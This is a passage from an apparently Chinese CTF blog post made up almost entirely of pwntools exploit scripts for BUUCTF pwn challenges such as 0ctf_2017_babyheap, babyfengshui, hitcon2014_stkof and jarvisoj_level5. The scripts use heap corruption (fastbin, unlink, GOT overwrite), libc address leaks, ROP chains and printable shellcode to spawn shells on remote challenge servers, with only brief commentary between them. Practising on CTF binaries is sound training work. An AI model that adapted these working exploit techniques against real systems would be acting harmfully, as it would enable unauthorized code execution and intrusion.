class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">29247</span>)</span><br><span class="line"><span class="comment">#p = process(&quot;./pwn&quot;)</span></span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx,size,value</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;CNote &gt; &quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Type &gt; &quot;</span>,<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Length &gt; &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Value &gt; &quot;</span>,value)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;CNote &gt; &quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;CNote &gt; &quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index &gt; &quot;</span>,<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line">system=<span class="number">0x8048500</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>,<span class="number">0x40</span>,<span class="string">b&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>,<span class="number">0x40</span>,<span class="string">b&#x27;bbbb&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;bash&#x27;</span>+p32(system)</span><br><span class="line"></span><br><span class="line">add(<span class="number">3</span>,<span class="number">0xc</span>,payload)</span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)</span><br><span class="line">p.inetractive()</span><br></pre></td></tr></table></figure><h2 id="0ctf-2017-babyheap"><a href="#0ctf-2017-babyheap" class="headerlink" title="0ctf_2017_babyheap"></a>0ctf_2017_babyheap</h2><p>详解见<a href="https://yufeiyu33.github.io/2024/10/08/fastbin-attack/">fastbin_attack | 鱼非愚 (yufeiyu33.github.io)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.terminal = [&#x27;gnome-terminal&#x27;, &#x27;-x&#x27;, &#x27;sh&#x27;, &#x27;-c&#x27;]</span></span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;node5.buuoj.cn&#x27;,25676)</span></span><br><span class="line">p=process(<span class="string">&#x27;./babyheap&#x27;</span>)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">allo</span>(<span class="params">size</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">fill</span>(<span class="params">index,size,content</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Size:&#x27;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">b&#x27;Content:&#x27;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dump</span>(<span class="params">index</span>):</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Command:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">b&#x27;Index:&#x27;</span>,<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Content:&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exit</span>():</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Command: \n&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;5&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unsorted_offset_arena</span>(<span class="params">idx</span>):</span><br><span class="line">    word_bytes = context.word_size / <span class="number">8</span></span><br><span class="line">    offset = <span class="number">4</span>  <span class="comment"># lock</span></span><br><span class="line">    offset += <span class="number">4</span>  <span class="comment"># flags</span></span><br><span class="line">    offset += word_bytes * <span class="number">10</span>  <span class="comment"># offset fastbin</span></span><br><span class="line">    offset += word_bytes * <span class="number">2</span>  <span class="comment"># top,last_remainder</span></span><br><span class="line">    offset += idx * <span class="number">2</span> * word_bytes  <span class="comment"># idx</span></span><br><span class="line">    offset -= word_bytes * <span class="number">2</span>  <span class="comment"># bin overlap</span></span><br><span class="line">    <span class="keyword">return</span> offset</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)</span><br><span class="line">allo(<span class="number">0x10</span>)</span><br><span class="line">allo(<span class="number">0x10</span>)</span><br><span class="line">allo(<span class="number">0x10</span>)</span><br><span class="line">allo(<span class="number">0x80</span>)</span><br><span class="line">allo(<span class="number">0x70</span>)</span><br><span class="line">debug()</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="number">0</span>)*<span class="number">3</span>+p64(<span class="number">0x21</span>)+p8(<span class="number">0x80</span>)</span><br><span class="line">pause()</span><br><span class="line">fill(<span class="number">0</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x21</span>)</span><br><span class="line">pause()</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x10</span>)</span><br><span class="line"></span><br><span class="line">payload1=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x10</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x91</span>)</span><br><span class="line">pause()</span><br><span class="line">fill(<span class="number">3</span>,<span class="built_in">len</span>(payload1),payload1)</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">dump(<span class="number">2</span>)</span><br><span class="line">pause()</span><br><span class="line">leak_addr = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>((leak_addr)))</span><br><span class="line"></span><br><span class="line">unsorted_offset_addr=unsorted_offset_arena(<span class="number">5</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(unsorted_offset_addr)))</span><br><span class="line">libc_base=leak_addr-unsorted_offset_addr-<span class="number">0x3c4b20</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(libc_base)))</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(libc_base+<span class="number">0x3c4aed</span>)))</span><br><span class="line"></span><br><span class="line">payload=p64(<span class="built_in">int</span>(libc_base+<span class="number">0x3c4aed</span>))<span class="comment">#0x3c4aed</span></span><br><span class="line"></span><br><span class="line">fill(<span class="number">2</span>,<span class="built_in">len</span>(payload),payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line">allo(<span class="number">0x60</span>)</span><br><span class="line"></span><br><span class="line">pause()</span><br><span class="line">gadgets=<span class="built_in">int</span>(libc_base+<span class="number">0x4526a</span>)</span><br><span class="line">payload =<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x13</span> + p64(gadgets)</span><br><span class="line"></span><br><span class="line">fill(<span class="number">6</span>, <span class="built_in">len</span>(payload), payload)</span><br><span class="line"></span><br><span class="line">allo(<span class="number">255</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="babyfengshui-33c3-2016"><a href="#babyfengshui-33c3-2016" class="headerlink" title="babyfengshui_33c3_2016"></a>babyfengshui_33c3_2016</h2><p>这题的关键是看懂题目的漏洞点，我反正开始没看出来</p><p><img src="https://blog-yfy.oss-cn-wuhan-lr.aliyuncs.com/202411132026465.png" alt="屏幕截图 2024-11-13 202602"></p><p>这个代码的意思是我们申请的chunk的地址加上输入的长度是否长于函数接下的chunk的地址（add一个函数时会生成两个chunk）</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">28502</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#libc=ELF(&#x27;/home/yfy/ctfpwn/glibc-all-in-one/glibc-all-in-one/libs/2.23-0ubuntu3_i386/libc-2.23.so&#x27;)</span></span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line">free_got=elf.got[<span class="string">&#x27;free&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size,name,length,text</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;0&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;size of description: &quot;</span>,<span class="built_in">str</span>(size))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;name: &quot;</span>,name)</span><br><span class="line">p.recvuntil(<span class="string">&quot;text length:&quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">p.recvuntil(<span class="string">&quot;text:&quot;</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">index</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">update</span>(<span class="params">index,length,text</span>):</span><br><span class="line">p.recvuntil(<span class="string">&quot;Action: &quot;</span>)</span><br><span class="line">p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;index: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">p.recvuntil(<span class="string">&quot;text length: &quot;</span>)</span><br><span class="line">p.sendline(<span class="built_in">str</span>(length))</span><br><span class="line">p.recvuntil(<span class="string">&quot;text: &quot;</span>)</span><br><span class="line">p.sendline(text)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">debug</span>():</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam1&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;aaaa&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam2&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;bbbb&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,<span class="string">&quot;nam3&quot;</span>,<span class="number">0x80</span>,<span class="string">&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line"><span class="comment">#debug()</span></span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">0x100</span>,<span class="string">&#x27;nam1&#x27;</span>,<span class="number">0x100</span>,<span class="string">&quot;cccc&quot;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x108</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x80</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p32(free_got)</span><br><span class="line">update(<span class="number">3</span>,<span class="number">0x200</span>,payload)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;description: &quot;</span>)</span><br><span class="line">free_addr=u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="comment">#libc=LibcSearcher(&quot;free&quot;,free_addr)</span></span><br><span class="line">libc_base=free_addr-libc.sym[<span class="string">&quot;free&quot;</span>]</span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line"></span><br><span class="line">update(<span class="number">1</span>,<span class="number">0x80</span>,p32(system_addr))</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="hitcon2014-stkof"><a href="#hitcon2014-stkof" class="headerlink" title="hitcon2014_stkof"></a>hitcon2014_stkof</h2><p><a href="https://yufeiyu33.github.io/2024/09/25/unlink/">pwn堆—unlink | 鱼非愚 (yufeiyu33.github.io)</a></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">context(arch = &#x27;amd64&#x27;,os = &#x27;linux&#x27;,log_level = &#x27;debug&#x27;)</span><br><span class="line">p=process(&#x27;./pwn&#x27;)</span><br><span class="line">#p=remote(&#x27;node5.buuoj.cn&#x27;,27761)</span><br><span class="line">elf=ELF(&#x27;./pwn&#x27;)</span><br><span class="line">atoi_got = elf.got[&#x27;atoi&#x27;]</span><br><span class="line">libc=ELF(&#x27;./libc-2.23.so&#x27;)</span><br><span class="line">free_got = elf.got[&#x27;free&#x27;]</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">#bss=0x6021C0</span><br><span class="line">bss=0x602140</span><br><span class="line">def add(size):</span><br><span class="line">    p.sendline(str(1))</span><br><span class="line">    p.sendline(str(size))</span><br><span class="line">    p.recvuntil(b&#x27;OK&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def edit(num,content):</span><br><span class="line">    p.sendline(str(2))</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    p.sendline(str(len(content)))</span><br><span class="line">    p.sendline(content)</span><br><span class="line">    p.recvuntil(b&#x27;OK&#x27;)</span><br><span class="line"></span><br><span class="line">def delete(num):</span><br><span class="line">    p.sendline(str(3))</span><br><span class="line">    p.sendline(str(num))</span><br><span class="line">    #p.recvuntil(b&#x27;OK&#x27;)</span><br><span class="line"></span><br><span class="line">#gdb.attach(p)</span><br><span class="line"></span><br><span class="line">add(0x30)</span><br><span class="line">add(0x80)</span><br><span class="line"></span><br><span class="line">add(0x80)</span><br><span class="line">add(0x30)</span><br><span class="line">payload=p64(0)+p64(0x80)+p64(bss-0x18)+p64(bss-0x10)+b&#x27;a&#x27;*(0x80-0x20)</span><br><span class="line">payload+=p64(0x80)+p64(0x90)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">pause()</span><br><span class="line">edit(2,payload)</span><br><span class="line"></span><br><span class="line">delete(3)</span><br><span class="line"></span><br><span class="line">payload2=b&#x27;c&#x27;*0x10</span><br><span class="line">payload2+=p64(free_got)+p64(puts_got)</span><br><span class="line">#payload2+=p64(free_got)+b&#x27;\x7f&#x27;+b&#x27;d&#x27;*5</span><br><span class="line">edit(2,payload2)</span><br><span class="line">payload1=p64(puts_plt)</span><br><span class="line"></span><br><span class="line">edit(1,payload1)</span><br><span class="line"></span><br><span class="line">delete(2)</span><br><span class="line"></span><br><span class="line">leak=u64(p.recvuntil(&#x27;\x7f&#x27;)[-6:]+b&#x27;\x00\x00&#x27;)</span><br><span class="line"></span><br><span class="line">print(hex(leak))</span><br><span class="line">libc_addr=leak-libc.sym[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">system=libc_addr+libc.sym[&#x27;system&#x27;]</span><br><span class="line"></span><br><span class="line">payload=p64(system)</span><br><span class="line"></span><br><span class="line">edit(1,payload)</span><br><span class="line"></span><br><span class="line">edit(4,&#x27;/bin/sh\x00&#x27;)</span><br><span class="line">delete(4)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="mrctf2020-shellcode-revenge"><a href="#mrctf2020-shellcode-revenge" class="headerlink" title="mrctf2020_shellcode_revenge"></a>mrctf2020_shellcode_revenge</h2><p>要求可见字符串的shellcode，第一次看到</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(arch = <span class="string">&#x27;amd64&#x27;</span>,os = <span class="string">&#x27;linux&#x27;</span>,log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">25572</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">shellcode=asm(shellcraft.sh())</span></span><br><span class="line"><span class="string">print(shellcode)</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">p.send(<span class="string">b&#x27;Ph0666TY1131Xh333311k13XjiV11Hc1ZXYf1TqIHf9kDqW02DqX0D1Hu3M2G0Z2o4H0u0P160Z0g7O0Z0C100y5O3G020B2n060N4q0n2t0B0001010H3S2y0Y0O0n0z01340d2F4y8P115l1n0J0h0a070t&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="jarvisoj-level5"><a href="#jarvisoj-level5" class="headerlink" title="jarvisoj_level5"></a>jarvisoj_level5</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line">context(log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3_x64&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;node5.buuoj.cn&#x27;</span>,<span class="number">26473</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;level3_x64&#x27;</span>)</span><br><span class="line">rdi=<span class="number">0x4006b3</span></span><br><span class="line">rsi_r15=<span class="number">0x4006b1</span></span><br><span class="line">ret=<span class="number">0x400499</span></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line"><span class="comment">#main=elf.sym[&#x27;main&#x27;]</span></span><br><span class="line">main=<span class="number">0x40061a</span></span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">b&#x27;Input:\n&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(rdi)+p64(<span class="number">0</span>)+p64(rsi_r15)+p64(write_got)+p64(<span class="number">8</span>)+p64(write_plt)+p64(main)</span><br><span class="line"><span class="comment">#pause()</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line">libc_leak=u64(p.recv(<span class="number">8</span>))</span><br><span class="line"><span class="comment">#libc_leak=u64(p.recv(6).strip().ljust(b&#x27;\00&#x27;))</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc_leak))</span><br><span class="line">libc = LibcSearcher(<span class="string">&quot;write&quot;</span>,libc_leak)</span><br><span class="line"></span><br><span class="line">libc_base=libc_leak-libc.dump(<span class="string">&#x27;write&#x27;</span>)</span><br><span class="line">system_addr=libc_base+libc.dump(<span class="string">&#x27;system&#x27;</span>)</span><br><span class="line">bin_sh_addr=libc_base+libc.dump(<span class="string">&#x27;str_bin_sh&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+p64(rdi)+p64(bin_sh_addr)+p64(system_addr)</span><br><span class="line"><span class="comment">#payload=b&#x27;a&#x27;*0x88+p64(rdi)+p64(bin_sh_addr)+p64(system_addr)+p64(0)</span></span><br><span class="line">p.sendline(payload)</span><br><span 